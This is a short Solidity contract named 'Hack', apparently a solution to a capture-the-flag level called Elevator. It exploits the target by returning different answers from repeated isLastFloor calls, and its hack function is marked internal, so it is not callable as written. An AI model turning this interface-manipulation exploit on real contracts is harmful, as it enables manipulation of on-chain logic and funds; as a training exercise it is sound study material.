// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.0;

import "./Elevator.sol";

contract Hack {

    Elevator private immutable elevator;
    uint256 private count;

    constructor( address _target) {
       elevator = Elevator(_target);
    }
    function hack() internal {
        elevator.goTo(0);
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1;
    }
}